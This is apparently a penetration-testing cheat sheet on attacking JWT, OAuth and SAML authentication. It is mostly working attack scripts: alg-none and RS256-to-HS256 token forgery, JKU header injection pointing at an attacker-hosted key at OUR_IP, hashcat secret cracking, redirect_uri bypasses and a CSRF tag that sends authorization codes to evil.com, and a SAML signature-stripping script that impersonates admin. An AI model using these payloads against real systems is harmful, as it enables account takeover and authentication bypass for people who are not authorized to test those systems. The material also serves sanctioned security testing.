title: Attacking Authentication Mechanisms
html:
Attacking Authentication Mechanisms

JWT

- Try JWT without a signature - Set signature algorithm to None - Brute-Force the secret of JWTs protected with symmetric algorithms - Attempt algorithm confusion for JWTs protected with asymmetric algorithms - Investigate whether the web application supports additional JWT claims such as - jwk - jku - x5c - x5u

OAuth

- Investigate if the redirect_uri is properly validated - Investigate if a state parameter is present and properly validated - Investigate for possible XSS vulnerabilities from reflected OAuth parameters

SAML

- Investigate the response to a SAML response when the signature has been removed - Manipulate the SAML response to explore Signature Wrapping vulnerabilities - Investigate XML Attacks such as XXE and XSLT Server-side Injection in the SAML XML data

JWT Attack Scripts

Decode without verification

import base64, json

def decode_jwt(token):
    parts = token.split('.')
    # Pad base64
    header  = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return header, payload

token = 'eyJ...'
h, p = decode_jwt(token)
print(h, p)

Algorithm None Attack

import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}

forged = b64url(header) + '.' + b64url(payload) + '.'
print(forged)

RS256 → HS256 Confusion (use RSA public key as HMAC secret)

import jwt

# Obtain server's RSA public key (from /jwks.json, /.well-known/jwks.json, or cert)
pub_key = open('server_pub.pem', 'rb').read()

payload = {'user': 'admin', 'role': 'admin'}
token = jwt.encode(payload, pub_key, algorithm='HS256')
print(token)

Brute-force HS256 secret

# hashcat
hashcat -a 0 -m 16500 'eyJ...<full_token>' /usr/share/wordlists/rockyou.txt

# jwt_tool
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

JKU / JWK Header Injection (point to attacker-controlled key)

import jwt, json
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Generate attacker key pair
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = key.public_key()

# Export numbers for JWKS
pub_numbers = pub.public_key().public_numbers() if hasattr(pub,'public_key') else pub.public_numbers()

jwks = {
    "keys": [{
        "kty": "RSA",
        "use": "sig",
        "kid": "attacker",
        "n": jwt.utils.to_base64url_uint(pub_numbers.n).decode(),
        "e": jwt.utils.to_base64url_uint(pub_numbers.e).decode(),
        "alg": "RS256"
    }]
}
# Host jwks at http://OUR_IP/jwks.json

headers = {"jku": "http://OUR_IP/jwks.json", "kid": "attacker"}
token = jwt.encode({'user': 'admin'}, key, algorithm='RS256', headers=headers)
print(token)

OAuth Attack Scripts

redirect_uri Bypass Variants

# Open redirect on same domain
https://TARGET/oauth/callback?code=AUTH_CODE&redirect_uri=https://TARGET/logout?next=https://evil.com

# Path traversal
redirect_uri=https://TARGET/callback/../../../evil.com

# Subdomain (if wildcards allowed)
redirect_uri=https://evil.TARGET.com/callback

CSRF on OAuth flow (missing state)

<!-- Force victim to authorize your app and capture their code -->
<img src="https://TARGET/oauth/authorize?client_id=ATTACKER_APP&redirect_uri=https://evil.com/capture&response_type=code&scope=read">

Token leakage via Referer

# If redirect_uri uses fragment (#), the token lands in browser history and Referer headers
response_type=token  (implicit flow)

SAML Attack Scripts

Remove Signature (if not validated)

from lxml import etree
import base64

# Base64 decode the SAMLResponse
saml_b64 = 'PHNhbWxwOlJ...'
xml = base64.b64decode(saml_b64)
root = etree.fromstring(xml)

# Remove Signature element
ns = {'ds': 'http://www.w3.org/2000/09/xmldsig#'}
for sig in root.findall('.//ds:Signature', ns):
    sig.getparent().remove(sig)

# Modify attribute (e.g., change NameID to admin)
ns2 = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}
for ni in root.findall('.//saml:NameID', ns2):
    ni.text = 'admin'

modified = base64.b64encode(etree.tostring(root)).decode()
print(modified)

XML Signature Wrapping (XSW)

Move the legitimate signed element into a non-evaluated position and inject a new unsigned assertion with elevated privileges. Test with SAML Raider Burp extension or saml-attack tool.
